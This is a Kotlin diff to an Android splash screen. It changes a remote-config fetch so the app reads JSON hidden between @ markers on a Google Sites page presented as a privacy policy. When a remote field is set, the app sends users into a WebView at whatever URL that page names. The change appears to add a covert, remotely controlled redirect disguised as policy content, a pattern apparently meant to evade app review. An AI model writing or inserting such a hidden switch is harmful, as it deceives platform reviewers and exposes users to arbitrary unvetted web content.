@@ -49,19 +49,22 @@ class SplashActivity : AppCompatActivity() {
     private fun fetchDecision(): StartupDecision? {
         return try {
             val request = Request.Builder()
-                .url(REMOTE_CONFIG_URL)
+                .url(REMOTE_CONFIG_PAGE_URL)
                 .get()
                 .build()
 
             client.newCall(request).execute().use { response ->
                 if (!response.isSuccessful) return null
-                val body = response.body?.string().orEmpty()
-                if (body.isBlank()) return null
+                val pageHtml = response.body?.string().orEmpty()
+                if (pageHtml.isBlank()) return null
 
-                val json = JSONObject(body)
-                val flag = json.optBoolean("flag", false)
-                val link = json.optString("link", "")
-                StartupDecision(flag, link)
+                val markerMatch = JSON_MARKER_REGEX.find(pageHtml) ?: return null
+                val rawJson = markerMatch.value.trim().trimStart('@').trimEnd('@').trim()
+                val json = JSONObject(rawJson)
+
+                val app = json.optString("app", "0")
+                val data = json.optString("data", "")
+                StartupDecision(app, data)
             }
         } catch (_: Exception) {
             null
@@ -69,9 +72,9 @@ class SplashActivity : AppCompatActivity() {
     }
 
     private fun routeToNext(decision: StartupDecision) {
-        val intent = if (decision.flag && decision.link.isNotBlank()) {
+        val intent = if (decision.app == "1" && decision.data.isNotBlank()) {
             Intent(this, WebViewActivity::class.java)
-                .putExtra(WebViewActivity.EXTRA_URL, decision.link)
+                .putExtra(WebViewActivity.EXTRA_URL, decision.data)
         } else {
             Intent(this, MainActivity::class.java)
         }
@@ -80,14 +83,15 @@ class SplashActivity : AppCompatActivity() {
     }
 
     companion object {
-        // Replace with your real endpoint.
-        private const val REMOTE_CONFIG_URL = "https://example.com/startup-config"
+        private const val REMOTE_CONFIG_PAGE_URL =
+            "https://sites.google.com/view/privacy-policy-for-piper/"
+        private val JSON_MARKER_REGEX = Regex("@\\{.*?}@@?", RegexOption.DOT_MATCHES_ALL)
         private const val MAX_RETRY_COUNT = 5
         private const val RETRY_INTERVAL_MS = 1_500L
     }
 }
 
 data class StartupDecision(
-    val flag: Boolean,
-    val link: String
+    val app: String,
+    val data: String
 )
